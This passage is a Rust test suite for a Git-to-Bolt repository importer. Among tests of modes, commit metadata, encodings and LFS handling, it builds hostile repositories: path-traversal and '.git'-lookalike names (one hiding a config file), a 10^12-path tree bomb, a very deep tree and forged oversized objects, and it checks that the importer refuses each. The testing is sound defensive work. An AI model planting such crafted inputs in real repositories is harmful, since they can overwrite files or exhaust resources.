                    ("sub", EntryKind::ProjectLink, 0),
                ]
            );
            let get = |name: &str| root.get(name).unwrap().id;
            assert_eq!(content(&store, &get("file.txt")), b"text\n");
            assert_eq!(content(&store, &get("link")), b"../elsewhere/\xff");
            assert_eq!(content(&store, &get("run.sh")), b"#!/bin/sh\n");
            let folder = store.listing(&get("folder")).unwrap();
            assert_eq!(folder.get("inner.txt").unwrap().id, get("file.txt"));
            let link = store
                .read_record(&get("sub"), ObjectKind::ProjectLink)
                .unwrap();
            assert_eq!(
                ProjectLink::decode(&link).unwrap(),
                ProjectLink::submodule(submodule.as_bytes())
            );
            assert_eq!(counts, Counts::default(), "{hash:?}");
        }
    }

    #[test]
    fn modes_git_no_longer_writes_convert_but_count_as_inexact() {
        let (dir, git) = repo(Sha1);
        let text = blob(&git, b"text\n");
        let empty = git.tree(&[]);
        // A zero-padded folder and a group-writable file, one level down.
        let old = git.tree(&[(b"100664", b"file", text), (b"040000", b"folder", empty)]);
        let id = commit_of(&git, &[(b"40000", b"old", old)]);
        let ((save, counts), store) = convert(dir.path(), "a", |c| {
            (c.commit(&id).unwrap(), c.counts().clone())
        });
        let root = store
            .listing(&store.save(&save, false).unwrap().root)
            .unwrap();
        let old = store.listing(&root.get("old").unwrap().id).unwrap();
        let kinds: Vec<(&str, EntryKind)> = old
            .entries()
            .iter()
            .map(|e| (e.name.as_str(), e.kind))
            .collect();
        assert_eq!(
            kinds,
            [("file", EntryKind::File), ("folder", EntryKind::Folder)]
        );
        assert_eq!(counts.inexact_commits, 1);
        assert_eq!(counts.skipped_entry_count, 0);
    }

    #[test]
    fn dangerous_names_are_skipped_and_listed() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"x");
        let hooks = git.tree(&[(b"100644", b"config", file)]);
        let bad = git.tree(&[
            (b"100644", b"", file),
            (b"100644", b".", file),
            (b"100644", b"..", file),
            // A folder goes with everything in it.
            (b"40000", b".GIT", hooks),
            (b"100644", ".g\u{200c}it".as_bytes(), file),
            (b"100644", b"a/b", file),
            (b"100644", b"git~1", file),
            (b"100644", b"ok", file),
        ]);
        let first = git.commit(&commit_bytes(&bad, &[], "", b"m\n"));
        // The same folder twice more, inside another.
        let both = git.tree(&[(b"40000", b"x", bad), (b"40000", b"y", bad)]);
        let second = git.commit(&commit_bytes(&both, &[], "", b"m\n"));
        let ((save, counts), store) = convert(dir.path(), "a", |c| {
            let save = c.commit(&first).unwrap();
            c.commit(&second).unwrap();
            (save, c.counts().clone())
        });
        let root = store
            .listing(&store.save(&save, false).unwrap().root)
            .unwrap();
        let names: Vec<&str> = root.entries().iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names, ["ok"]);
        // Each is listed once, where it was met first: a Git tree converts once.
        let hex = first.to_hex();
        let want: Vec<(String, String)> = ["", ".", "..", ".GIT", ".g\u{200c}it", "a/b", "git~1"]
            .into_iter()
            .map(|path| (hex.clone(), path.to_owned()))
            .collect();
        assert_eq!(counts.skipped_entries, want);
        assert_eq!(counts.skipped_entry_count, 7);
        // Neither commit can be recreated exactly.
        assert_eq!(counts.inexact_commits, 2);
    }

    #[test]
    fn bolt_names_are_skipped_with_a_warning() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"x");
        let project = git.tree(&[(b"100644", b"format", file)]);
        let game = git.tree(&[
            (b"100644", b".BOLT.", file),
            (b"40000", b".bolt", project),
            (b"100644", ".b\u{200c}olt".as_bytes(), file),
            (b"100644", b"README", file),
            (b"100644", b"bolt~1", file),
        ]);
        let id = commit_of(&git, &[(b"40000", b"game", game)]);
        let ((save, counts), store) = convert(dir.path(), "a", |c| {
            (c.commit(&id).unwrap(), c.counts().clone())
        });
        let root = store
            .listing(&store.save(&save, false).unwrap().root)
            .unwrap();
        let game = store.listing(&root.get("game").unwrap().id).unwrap();
        let names: Vec<&str> = game.entries().iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names, ["README"]);
        let paths: Vec<&str> = counts
            .skipped_entries
            .iter()
            .map(|(_, p)| p.as_str())
            .collect();
        assert_eq!(
            paths,
            [
                "game/.BOLT.",
                "game/.bolt",
                "game/.b\u{200c}olt",
                "game/bolt~1"
            ]
        );
        assert_eq!(counts.skipped_entry_count, 4);
        assert_eq!(counts.inexact_commits, 1);
    }

    #[test]
    fn a_long_name_stops_the_import() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"x");
        // Windows' 255 UTF-16 units: 765 bytes of three-byte characters (decision 051).
        let longest = "語".repeat(255);
        let fine = commit_of(&git, &[(b"100644", longest.as_bytes(), file)]);
        let too_long = "x".repeat(766);
        let deep = git.tree(&[(b"100644", too_long.as_bytes(), file)]);
        let id = commit_of(&git, &[(b"40000", b"deep", deep)]);
        let ((fine, long), _) = convert(dir.path(), "a", |c| (c.commit(&fine), c.commit(&id)));
        assert!(fine.is_ok(), "{fine:?}");
        // The name is shown cut, so a hostile one can't flood the message.
        let shown = format!("deep/{}...", "x".repeat(255));
        assert_refused(long, &[&id.to_hex(), "765 bytes", &shown]);
    }

    #[test]
    fn a_path_over_4096_bytes_stops_the_import_naming_it() {
        let (dir, git) = repo(Sha1);
        // Five folders of 700-byte names, and a file whose name brings its path to 4,096 bytes, or
        // one more.
        let folders = |below: GitId| {
            (0..5).fold(below, |tree, _| {
                git.tree(&[(b"40000", "d".repeat(700).as_bytes(), tree)])
            })
        };
        let file = |len| git.tree(&[(b"100644", "f".repeat(len).as_bytes(), blob(&git, b"x"))]);
        let (fits, past) = (folders(file(591)), folders(file(592)));
        let commit = |tree: &GitId| git.commit(&commit_bytes(tree, &[], "", b"m\n"));
        let (fits, past) = (commit(&fits), commit(&past));
        let ((fits, stopped), _) = convert(dir.path(), "a", |c| (c.commit(&fits), c.commit(&past)));
        assert!(fits.is_ok(), "{fits:?}");
        // Named by the end of its path, as long paths are.
        let name = format!("`…/{}`", "f".repeat(592));
        assert_refused(stopped, &[&past.to_hex(), "longer than 4096 bytes", &name]);

        // A folder converted before is judged where it is met again: its paths reach 2,104 bytes
        // below it.
        let (dir, git) = repo(Sha1);
        let shared = (0..3).fold(
            git.tree(&[(b"100644", b"f", blob(&git, b"x"))]),
            |tree, _| git.tree(&[(b"40000", "s".repeat(700).as_bytes(), tree)]),
        );
        let above = |levels| {
            (0..levels).fold(shared, |tree, _| {
                git.tree(&[(b"40000", "u".repeat(700).as_bytes(), tree)])
            })
        };
        let commit = |tree: GitId| git.commit(&commit_bytes(&tree, &[], "", b"m\n"));
        let (first, fits, past) = (commit(shared), commit(above(2)), commit(above(3)));
        let ((first, fits, stopped), _) = convert(dir.path(), "a", |c| {
            (c.commit(&first), c.commit(&fits), c.commit(&past))
        });
        assert!(first.is_ok() && fits.is_ok(), "{first:?} {fits:?}");
        let below = format!("{}/…`", "u".repeat(700));
        assert_refused(stopped, &[&past.to_hex(), "longer than 4096 bytes", &below]);
    }

    #[test]
    fn names_that_arent_utf8_stop_with_a_list_of_all() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"x");
        let hidden = git.tree(&[(b"100644", b"in-\xff", file)]);
        let top = git.tree(&[
            (b"100644", b"caf\xe9", file),
            // Not looked into: its own name is listed.
            (b"40000", b"d\xff", hidden),
            (b"100644", b"ok", file),
        ]);
        let first = git.commit(&commit_bytes(&top, &[], "", b"first\n"));
        // A later commit with another such name: the stop lists both commits' names.
        let lib = git.tree(&[(b"100644", b"na\xefve", file)]);
        let second_top = git.tree(&[(b"40000", b"lib", lib), (b"100644", b"ok", file)]);
        let second = git.commit(&commit_bytes(&second_top, &[first], "", b"second\n"));
        // The first commit's folder again: met before, so not listed again.
        let third_top = git.tree(&[(b"40000", b"old", top)]);
        let third = git.commit(&commit_bytes(&third_top, &[second], "", b"third\n"));
        let ((saves, counts, finished), store) = convert(dir.path(), "a", |c| {
            let one = c.commit(&first).unwrap();
            let two = c.commit(&second).unwrap();
            let three = c.commit(&third).unwrap();
            ([one, two, three], c.counts().clone(), c.finish())
        });
        match finished {
            Err(ImportError::NotUtf8Names {
                first: listed,
                count,
            }) => {
                let want = [
                    (first, "caf\u{fffd}"),
                    (first, "d\u{fffd}"),
                    (second, "lib/na\u{fffd}ve"),
                ]
                .map(|(commit, path)| (commit.to_hex(), path.to_owned()));
                assert_eq!(listed, want);
                assert_eq!(count, 3);
            }
            other => panic!("{other:?}"),
        }
        // Until then they are left out, and their commits count as inexact.
        let root = store
            .listing(&store.save(&saves[0], false).unwrap().root)
            .unwrap();
        let names: Vec<&str> = root.entries().iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names, ["ok"]);
        assert_eq!(counts.inexact_commits, 3);
        // Past the first 100, they are only counted.
        let names: Vec<Vec<u8>> = (0..101)
            .map(|i| [format!("{i:03}").as_bytes(), b"\xff"].concat())
            .collect();
        let entries: Vec<(&[u8], &[u8], GitId)> = names
            .iter()
            .map(|n| (&b"100644"[..], &n[..], file))
            .collect();
        let id = commit_of(&git, &entries);
        let (e, _) = convert(dir.path(), "b", |c| {
            c.commit(&id).unwrap();
            c.finish().unwrap_err()
        });
        match &e {
            ImportError::NotUtf8Names { first, count } => {
                assert_eq!((first.len(), *count), (100, 101));
                assert_eq!(first[99].1, "099\u{fffd}");
            }
            other => panic!("{other:?}"),
        }
        assert!(e.to_string().contains("101 names"), "{e}");
        assert!(e.to_string().contains("and 1 more"), "{e}");
        assert!(e.hint().unwrap().starts_with("Nothing was changed."));
    }

    #[test]
    fn listed_paths_and_names_stay_small() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"x");
        // Names of 100 KB: one holding `/`, so skipped; one that isn't UTF-8; one only too long.
        let slashed = [&[b'a'; 50_000][..], b"/", &[b'a'; 50_000]].concat();
        let not_utf8 = [&[b'n'; 100_000][..], b"\xff"].concat();
        let long = vec![b'z'; 100_000];
        // Each under 15 levels of 255-byte folder names: about 4 KB of path above it, within a
        // path's limit.
        let folder = "d".repeat(255);
        let deep = |name: &[u8]| {
            let mut tree = git.tree(&[(b"100644", name, file)]);
            for _ in 0..15 {
                tree = git.tree(&[(b"40000", folder.as_bytes(), tree)]);
            }
            git.commit(&commit_bytes(&tree, &[], "", b"m\n"))
        };
        let (skipped, bad, too_long) = (deep(&slashed), deep(&not_utf8), deep(&long));
        let ((counts, finished, stopped), _) = convert(dir.path(), "a", |c| {
            c.commit(&skipped).unwrap();
            c.commit(&bad).unwrap();
            (c.counts().clone(), c.finish(), c.commit(&too_long))
        });
        // The end of a path is kept, after `…/`, and a name is cut at 255 bytes.
        let small = |path: &str| {
            assert!(path.len() < 1400, "{} bytes", path.len());
            assert!(path.starts_with("…/"), "{path}");
        };
        let listed = &counts.skipped_entries[0].1;
        small(listed);
        assert!(listed.ends_with(&format!("{folder}/{}...", "a".repeat(255))));
        let e = finished.unwrap_err();
        let ImportError::NotUtf8Names { first, .. } = &e else {
            panic!("{e:?}")
        };
        small(&first[0].1);
        assert!(e.to_string().len() < 2000, "{} bytes", e.to_string().len());
        let stopped = stopped.unwrap_err().to_string();
        assert!(stopped.len() < 2000, "{} bytes", stopped.len());
    }

    #[test]
    fn a_commit_too_big_to_keep_is_refused_before_it_is_read() {
        let (dir, git) = repo(Sha1);
        // It says it is a 3 MiB commit but holds nothing more: reading it would fail as damage,
        // so a refusal naming its size shows it was never read.
        let id = GitId::from_hex(Sha1, &"c0".repeat(20)).unwrap();
        let size = 3 << 20;
        let header = format!("commit {size}\0");
        let compressed = miniz_oxide::deflate::compress_to_vec_zlib(header.as_bytes(), 6);
        git.raw_loose(&id.to_hex(), &compressed);
        let (result, _) = convert(dir.path(), "a", |c| c.commit(&id));
        match result {
            Err(e @ ImportError::Git(GitError::Unimportable { .. })) => {
                let message = e.to_string();
                assert!(message.contains(&id.to_hex()), "{message}");
                assert!(message.contains(&format!("{size} bytes")), "{message}");
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn a_tree_bomb_stops_at_the_entry_limit_quickly() {
        let (dir, git) = repo(Sha1);
        let names: Vec<String> = (0..1000).map(|i| format!("{i:04}")).collect();
        let level = |mode: &[u8], id: GitId| {
            let entries: Vec<(&[u8], &[u8], GitId)> =
                names.iter().map(|n| (mode, n.as_bytes(), id)).collect();
            git.tree(&entries)
        };
        // 4 levels of 1,000 entries, each the same as its neighbours: 10^12 paths.
        let mut tree = level(b"100644", blob(&git, b"x"));
        for _ in 0..3 {
            tree = level(b"40000", tree);
        }
        let id = git.commit(&commit_bytes(&tree, &[], "", b"m\n"));
        let started = Instant::now();
        let (result, _) = convert(dir.path(), "a", |c| c.commit(&id));
        assert!(
            started.elapsed() < Duration::from_secs(20),
            "{:?}",
            started.elapsed()
        );
        assert_refused(
            result,
            &[&id.to_hex(), "more than 10000000 files and folders"],
        );
    }

    /// A path's limit comes before the 4,096 levels: folders named `a` reach it 2,049 deep.
    #[test]
    fn a_deep_tree_stops_at_the_path_limit_without_running_out_of_stack() {
        let (dir, git) = repo(Sha1);
        // Tree `k` holds `k` levels of folders; one pack holds them all.
        let mut trees = vec![(Vec::new(), object_id(ObjectType::Tree, b"", Sha1).unwrap())];
        for _ in 0..2049 {
            let below = trees.last().unwrap().1;
            let bytes = [&b"40000 a\0"[..], below.as_bytes()].concat();
            let id = object_id(ObjectType::Tree, &bytes, Sha1).unwrap();
            trees.push((bytes, id));
        }
        let entries: Vec<PackEntry> = trees
            .iter()
            .map(|(bytes, _)| PackEntry::Whole(ObjectType::Tree, bytes.clone()))
            .collect();
        git.pack(&entries);
        // The deepest folder's path is 4,095 bytes, and one level more 4,097.
        let at_limit = git.commit(&commit_bytes(&trees[2048].1, &[], "", b"m\n"));
        let past = git.commit(&commit_bytes(&trees[2049].1, &[], "", b"m\n"));
        let path = dir.path().to_owned();
        // A walk that recursed once a level would need far more stack than this.
        let (fresh, fine, known) = std::thread::Builder::new()
            .stack_size(256 << 10)
            .spawn(move || {
                convert(&path, "a", |c| {
                    // Read level by level the first time, then from what was converted since.
                    let fresh = c.commit(&past).map(drop);
                    let fine = c.commit(&at_limit).map(drop);
                    (fresh, fine, c.commit(&past).map(drop))
                })
                .0
            })
            .unwrap()
            .join()
            .unwrap();
        assert!(fine.is_ok(), "{fine:?}");
        assert_refused(fresh, &[&past.to_hex(), "longer than 4096 bytes"]);
        assert_refused(known, &[&past.to_hex(), "longer than 4096 bytes"]);
    }

    #[test]
    fn commit_fields_carry_over() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[(b"100644", b"a", blob(&git, b"a"))]);
        let first = git.commit(&commit_bytes(&tree, &[], "", b"first\n"));
        let other = git.commit(&commit_bytes(&tree, &[], "", b"other\n"));
        let merge = git.commit(&commit_bytes(
            &tree,
            &[first, other],
            "",
            b"Merge\n\nBody.\n",
        ));
        let (saves, store) = convert(dir.path(), "a", |c| {
            let first = c.commit(&first).unwrap();
            let other = c.commit(&other).unwrap();
            [first, other, c.commit(&merge).unwrap()]
        });
        let save = store.save(&saves[2], false).unwrap();
        assert_eq!(save.parents, [saves[0], saves[1]]);
        assert_eq!(
            save.author,
            Person {
                name: "A U Thor".into(),
                email: "author@example.com".into(),
                time_ms: 1_112_912_053_000,
                tz_offset_min: -420,
            }
        );
        assert_eq!(
            save.saver,
            Person {
                name: "C O Mitter".into(),
                email: "committer@example.com".into(),
                time_ms: 1_112_912_100_000,
                tz_offset_min: 330,
            }
        );
        assert_eq!(save.message, "Merge\n\nBody.\n");
        assert_eq!(save.change_id, ChangeId::from_git_commit(merge.as_bytes()));
        // Only `git-commit`: no `line`, since Git never recorded where a commit was made.
        assert_eq!(
            save.extra,
            BTreeMap::from([(EXTRA_GIT_COMMIT.to_owned(), merge.to_hex().into_bytes())])
        );
        assert!(save.move_notes.is_empty() && save.signature.is_empty());
        // One tree, one listing.
        assert_eq!(store.save(&saves[0], false).unwrap().root, save.root);
        let root = store.listing(&save.root).unwrap();
        assert_eq!(content(&store, &root.get("a").unwrap().id), b"a");
    }

    #[test]
    fn a_parent_must_be_converted_first() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[]);
        let first = git.commit(&commit_bytes(&tree, &[], "", b"first\n"));
        let child = git.commit(&commit_bytes(&tree, &[first], "", b"child\n"));
        let (early, _) = convert(dir.path(), "a", |c| c.commit(&child));
        match early {
            Err(ImportError::Stop { what, .. }) => {
                assert!(what.contains(&first.to_hex()), "{what}");
                assert!(what.contains("report"), "{what}");
            }
            other => panic!("{other:?}"),
        }
        let (saves, store) = convert(dir.path(), "b", |c| {
            [c.commit(&first).unwrap(), c.commit(&child).unwrap()]
        });
        assert_eq!(store.save(&saves[1], false).unwrap().parents, [saves[0]]);
    }

    #[test]
    fn a_listing_two_trees_make_is_stored_once_across_packs() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"x");
        // Two Git trees, one listing: Bolt reads both modes as a plain file.
        let standard = commit_of(&git, &[(b"100644", b"a", file)]);
        let group_writable = commit_of(&git, &[(b"100664", b"a", file)]);
        // Two objects a pack: the first listing's pack is in the store by the second tree. (Not
        // one: a pack of the listing alone again would have the same name, and replace it.)
        let (saves, store) = convert_in_packs_of(2, dir.path(), "a", |c| {
            [standard, group_writable].map(|id| c.commit(&id).unwrap())
        });
        assert_eq!(stored(dir.path(), "a", ObjectKind::FolderListing), 1);
        let roots = saves.map(|save| store.save(&save, false).unwrap().root);
        assert_eq!(roots[0], roots[1]);
    }

    #[test]
    fn git_header_is_kept_only_when_needed() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[]);
        let plain = git.commit(&commit_bytes(&tree, &[], "", b"plain\n"));
        let signed = commit_bytes(&tree, &[plain], GPGSIG, b"signed\n");
        let signed_id = git.commit(&signed);
        // Git allows a parent twice; a save lists it once.
        let twice = commit_bytes(&tree, &[plain, plain], "", b"twice\n");
        let twice_id = git.commit(&twice);
        let jj = commit_bytes(
            &tree,
            &[],
            "change-id zyxwvutsrqponmlkzyxwvutsrqponmlk\n",
            b"from jj\n",
        );
        let jj_id = git.commit(&jj);
        let (saves, store) = convert(dir.path(), "a", |c| {
            let plain = c.commit(&plain).unwrap();
            [
                plain,
                c.commit(&signed_id).unwrap(),
                c.commit(&twice_id).unwrap(),
                c.commit(&jj_id).unwrap(),
            ]
        });
        let save = |n: usize| store.save(&saves[n], false).unwrap();
        let header = |raw: &[u8]| Some(parse_commit(raw, Sha1).unwrap().header.to_vec());
        assert_eq!(save(0).extra.get(EXTRA_GIT_HEADER), None);
        assert_eq!(
            save(1).extra.get(EXTRA_GIT_HEADER).cloned(),
            header(&signed)
        );
        assert_eq!(save(2).parents, [saves[0]]);
        assert_eq!(save(2).extra.get(EXTRA_GIT_HEADER).cloned(), header(&twice));
        assert_eq!(save(3).extra.get(EXTRA_GIT_HEADER).cloned(), header(&jj));
        assert_eq!(save(3).change_id.0[..2], [0x01, 0x23]);
    }

    /// A header's change ID goes to the first commit converted that has it; the others take their
    /// own commits' change IDs, and are counted (decision 043).
    #[test]
    fn a_change_id_header_gives_its_id_to_one_save() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[]);
        let header = "change-id zyxwvutsrqponmlkzyxwvutsrqponmlk\n";
        let first = git.commit(&commit_bytes(&tree, &[], header, b"first\n"));
        let again = git.commit(&commit_bytes(&tree, &[first], header, b"again\n"));
        let short = "change-id zyxwvutsrqponmlk\n";
        let odd = git.commit(&commit_bytes(&tree, &[again], short, b"odd\n"));
        let ((saves, counts), store) = convert(dir.path(), "a", |c| {
            let saves = [first, again, odd].map(|id| c.commit(&id).unwrap());
            (saves, c.counts().clone())
        });
        let change_id = |n: usize| store.save(&saves[n], false).unwrap().change_id;
        let wanted = ChangeId::from_jujutsu(b"zyxwvutsrqponmlkzyxwvutsrqponmlk").unwrap();
        assert_eq!(change_id(0), wanted);
        assert_eq!(change_id(1), ChangeId::from_git_commit(again.as_bytes()));
        // A header that isn't 16 bytes in Jujutsu's letters is passed over, as Jujutsu does, and
        // isn't counted.
        assert_eq!(change_id(2), ChangeId::from_git_commit(odd.as_bytes()));
        assert_eq!(counts.duplicate_change_ids, 1);
    }

    #[test]
    fn every_commit_rebuilds_to_its_own_id() {
        /// An unusual commit: what is odd about it, its people lines, its other headers, its
        /// message, and its parents among three plain commits.
        struct Case {
            what: &'static str,
            people: Vec<u8>,
            headers: &'static str,
            message: &'static [u8],
            parents: &'static [usize],
        }
        let usual = |what, headers, message, parents| Case {
            what,
            people: PEOPLE.as_bytes().to_vec(),
            headers,
            message,
            parents,
        };
        let committer = "committer C O Mitter <committer@example.com> 1112912100 +0530\n";
        let odd_author = |what, line: &[u8]| Case {
            what,
            people: [b"author ", line, b"\n", committer.as_bytes()].concat(),
            headers: "",
            message: b"m\n",
            parents: &[],
        };
        let long_name = format!("{} <a@b> 1 +0000", "n".repeat(5000));
        let cases = [
            usual("a root commit", "", b"first\n", &[]),
            usual("a signature", GPGSIG, b"signed\n", &[0]),
            usual("a signed merge", MERGETAG, b"Merge\n", &[0, 1]),
            usual("an octopus merge", "", b"Merge\n", &[0, 1, 2]),
            usual("a parent twice", "", b"twice\n", &[1, 1]),
            usual("an encoding", "encoding ISO-8859-1\n", b"caf\xe9\n", &[]),
            usual("a message that isn't UTF-8", "", b"caf\xe9\n", &[]),
            usual(
                "a change-id",
                "change-id zyxwvutsrqponmlkzyxwvutsrqponmlk\n",
                b"m",
                &[],
            ),
            usual("other headers", "x-tool bolt\n more\n", b"m\n", &[]),
            usual("an empty message", "", b"", &[]),
            usual("no LF at the end", "", b"no end", &[]),
            odd_author("a -0000 zone", b"A <a@b> 1 -0000"),
            odd_author("two spaces", b"A  <a@b> 1 +0000"),
            odd_author("no email", b"A U Thor 1112912053 -0700"),
            odd_author("a huge time", b"A <a@b> 99999999999999999999 +0000"),
            odd_author("a name that isn't UTF-8", b"Ren\xe9 <r@x> 1 +0000"),
            odd_author("a name over 4 KiB", long_name.as_bytes()),
        ];
        for hash in [Sha1, Sha256] {
            let (dir, git) = repo(hash);
            let tree = git.tree(&[(b"100644", b"a", blob(&git, b"a"))]);
            let others: Vec<GitId> = ["p\n", "q\n", "r\n"]
                .map(|m| git.commit(&commit_bytes(&tree, &[], "", m.as_bytes())))
                .to_vec();
            let mut commits: Vec<(&str, GitId)> = Vec::new();
            for case in &cases {
                let parents: Vec<GitId> = case.parents.iter().map(|&i| others[i]).collect();
                let raw = raw_commit(
                    &tree.to_hex(),
                    &parents,
                    &case.people,
                    case.headers,
                    case.message,
                );
                commits.push((case.what, git.commit(&raw)));
            }
            // A tree written in capitals, which Git reads too.
            let upper = raw_commit(
                &tree.to_hex().to_uppercase(),
                &[],
                PEOPLE.as_bytes(),
                "",
                b"m\n",
            );
            commits.push(("a tree ID in capitals", git.commit(&upper)));
            let (saves, store) = convert(dir.path(), "a", |c| {
                for other in &others {
                    c.commit(other).unwrap();
                }
                commits
                    .iter()
                    .map(|(what, id)| c.commit(id).unwrap_or_else(|e| panic!("{what}: {e}")))
                    .collect::<Vec<Id>>()
            });
            for ((what, id), save) in commits.iter().zip(&saves) {
                let save = store.save(save, false).unwrap();
                // As an export would: each parent's commit from its save.
                let parents: Vec<GitId> = save
                    .parents
                    .iter()
                    .map(|p| git_commit(&store, p, hash))
                    .collect();
                let rebuilt = rebuild_commit(&save, &tree, &parents);
                let rebuilt = object_id(ObjectType::Commit, &rebuilt, hash).unwrap();
                assert_eq!(rebuilt, *id, "{what} ({hash:?})");
            }
        }
    }

    #[test]
    fn a_latin1_message_is_decoded_and_its_bytes_kept() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[]);
        let commits = [
            ("encoding ISO-8859-1\n", &b"caf\xe9 cr\xe8me\n"[..]),
            ("encoding Shift_JIS\n", b"\x93\xfa\x96\x7b\n"),
            ("", b"caf\xe9\n"),
            ("encoding x-klingon\n", b"caf\xe9\n"),
            // Bytes that are UTF-8 already are taken as they are, whatever is declared.
            ("encoding ISO-8859-1\n", "caf\u{e9}\n".as_bytes()),
        ]
        .map(|(headers, message)| git.commit(&commit_bytes(&tree, &[], headers, message)));
        let (saves, store) = convert(dir.path(), "a", |c| {
            commits.map(|id| c.commit(&id).unwrap())
        });
        let save = |n: usize| store.save(&saves[n], false).unwrap();
        let original = |n: usize| save(n).extra.get(EXTRA_GIT_ORIGINAL_MESSAGE).cloned();
        assert_eq!(save(0).message, "caf\u{e9} cr\u{e8}me\n");
        assert_eq!(original(0), Some(b"caf\xe9 cr\xe8me\n".to_vec()));
        assert_eq!(save(1).message, "\u{65e5}\u{672c}\n");
        assert_eq!(original(1), Some(b"\x93\xfa\x96\x7b\n".to_vec()));
        // Without an encoding Bolt knows, bytes that aren't UTF-8 become U+FFFD.
        for n in [2, 3] {
            assert_eq!(save(n).message, "caf\u{fffd}\n");
            assert_eq!(original(n), Some(b"caf\xe9\n".to_vec()));
        }
        assert_eq!(save(4).message, "caf\u{e9}\n");
        assert_eq!(original(4), None);
        // The standard form rebuilds a message without an `encoding` line.
        assert!(!save(2).extra.contains_key(EXTRA_GIT_HEADER));
        assert!(save(0).extra.contains_key(EXTRA_GIT_HEADER));
    }

    #[test]
    fn an_oversized_message_stops_the_import() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[]);
        let commit =
            |headers: &str, message: &[u8]| git.commit(&commit_bytes(&tree, &[], headers, message));
        let largest = commit("", &vec![b'a'; 1 << 20]);
        let too_large = commit("", &vec![b'a'; (1 << 20) + 1]);
        let largest_latin1 = commit("", &vec![0xe9; 64 << 10]);
        let too_large_latin1 = commit("", &vec![0xe9; (64 << 10) + 1]);
        let huge_header = commit(&format!("x-long {}\n", "h".repeat(64 << 10)), b"m\n");
        let (results, _) = convert(dir.path(), "a", |c| {
            [
                largest,
                too_large,
                largest_latin1,
                too_large_latin1,
                huge_header,
            ]
            .map(|id| c.commit(&id))
        });
        let [
            largest_r,
            too_large_r,
            largest_latin1_r,
            too_large_latin1_r,
            huge_header_r,
        ] = results;
        assert!(largest_r.is_ok(), "{largest_r:?}");
        assert!(largest_latin1_r.is_ok(), "{largest_latin1_r:?}");
        assert_refused(too_large_r, &[&too_large.to_hex(), "1 MiB"]);
        assert_refused(
            too_large_latin1_r,
            &[&too_large_latin1.to_hex(), "isn't UTF-8"],
        );
        assert_refused(huge_header_r, &[&huge_header.to_hex(), "64 KiB"]);
    }

    /// The entry at `path` (names joined by `/`) of the save `save`.
    fn entry_at(store: &Store, save: &Id, path: &str) -> Entry {
        let mut listing = store
            .listing(&store.save(save, false).unwrap().root)
            .unwrap();
        let mut names = path.split('/').peekable();
        loop {
            let entry = listing.get(names.next().unwrap()).unwrap().clone();
            if names.peek().is_none() {
                return entry;
            }
            listing = store.listing(&entry.id).unwrap();
        }
    }

    /// A file Git LFS's parser takes for a pointer comes in as the file it stands for, once for
    /// each object however many pointers name it; a link holding a pointer's text, and a file
    /// that only looks like one, come in as they are.
    #[test]
    fn git_lfs_files_come_in_as_what_they_stand_for() {
        let (dir, git) = repo(Sha1);
        let real = b"the real picture\n";
        let pointer = git.lfs_object(real);
        let pointer_blob = blob(&git, pointer.as_bytes());
        let crlf = blob(&git, pointer.replace('\n', "\r\n").as_bytes());
        let lookalike = format!("{pointer}and more\n");
        let assets = git.tree(&[
            (b"100644", b"again.psd", crlf),
            (b"100644", b"hero.psd", pointer_blob),
            (b"120000", b"link", pointer_blob),
            (b"100644", b"looks.psd", blob(&git, lookalike.as_bytes())),
        ]);
        let id = commit_of(&git, &[(b"40000", b"assets", assets)]);
        let ((save, counts), store) = convert(dir.path(), "a", |c| {
            let save = c.commit(&id).unwrap();
            (save, c.counts().clone())
        });
        for name in ["again.psd", "hero.psd"] {
            let entry = entry_at(&store, &save, &format!("assets/{name}"));
            assert_eq!(entry.size, real.len() as u64, "{name}");
            assert_eq!(content(&store, &entry.id), real, "{name}");
        }
        let link = entry_at(&store, &save, "assets/link");
        assert_eq!(content(&store, &link.id), pointer.as_bytes());
        let looks = entry_at(&store, &save, "assets/looks.psd");
        assert_eq!(content(&store, &looks.id), lookalike.as_bytes());
        assert_eq!(
            (counts.lfs_files, counts.lfs_bytes, counts.lfs_commits),
            (1, real.len() as u64, 1)
        );
        assert_eq!(counts.inexact_lfs_pointers, 1);
        assert_eq!(counts.lfs_lookalike_count, 1);
        assert_eq!(
            counts.lfs_lookalikes,
            [(id.to_hex(), "assets/looks.psd".to_owned())]
        );
    }

    /// A Git LFS object too long to cut is read once for both its hashes, then again to store it
    /// whole. One whose SHA-256 isn't its pointer's stops the import before anything is stored;
    /// bytes that change between the reads are refused by `add_content_from`, which stores nothing
    /// that isn't the ID it was given.
    #[test]
    fn an_lfs_object_too_long_to_cut_is_read_twice_and_checked() {
        // Files of 1 to 2 MiB are cut; a longer one is too long to cut.
        set_test_cut_sizes(Some((1 << 20, 2 << 20)));
        let (dir, git) = repo(Sha1);
        let real = noise(9, 3 << 20);
        let pointer = git.lfs_object(&real);
        let id = commit_of(
            &git,
            &[(b"100644", b"big.bin", blob(&git, pointer.as_bytes()))],
        );
        let (save, store) = convert(dir.path(), "a", |c| c.commit(&id).unwrap());
        let entry = entry_at(&store, &save, "big.bin");
        assert_eq!(entry.id, crate::id::hash_content(&real));
        assert!(content(&store, &entry.id) == real);
        assert_eq!(stored(dir.path(), "a", ObjectKind::Content), 1);
        assert_eq!(stored(dir.path(), "a", ObjectKind::ChunkList), 0);
        // Other bytes of the same length where its object goes.
        let at = dir.path().join(".git").join(lfs_pointer_to(&real).1);
        fs::write(&at, noise(10, 3 << 20)).unwrap();
        let (result, _) = convert(dir.path(), "b", |c| c.commit(&id));
        let e = result.unwrap_err();
        assert!(
            matches!(&e, ImportError::LfsMismatch { path, .. } if path == "big.bin"),
            "{e:?}"
        );
        assert_eq!(stored(dir.path(), "b", ObjectKind::Content), 0);
